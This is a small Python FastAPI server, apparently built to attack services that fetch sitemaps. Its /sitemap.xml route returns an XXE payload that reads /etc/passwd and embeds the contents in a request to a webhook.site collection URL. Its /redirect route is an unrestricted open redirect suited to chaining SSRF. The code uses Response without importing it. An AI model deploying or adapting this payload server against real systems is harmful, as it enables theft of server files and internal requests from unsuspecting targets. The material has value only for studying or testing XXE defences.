from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import RedirectResponse

app = FastAPI()

@app.get("/")
def home():
    return {"message": "Hello, World!"}

@app.get("/sitemap.xml")
def sitemap():
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://webhook.site/371086e9-abd3-4e87-bf64-01031f74dc96/?abc=&xxe;</loc>
    <lastmod>2025-07-30</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>
"""
    return Response(content=xml_content, media_type="application/xml")

# ---- Redirect endpoint ----
@app.get("/redirect")
def redirect(url: str):
    if not (url.startswith("http://") or url.startswith("https://")):
        raise HTTPException(status_code=400, detail="Invalid URL scheme. Only http/https allowed.")

    return RedirectResponse(url=url)
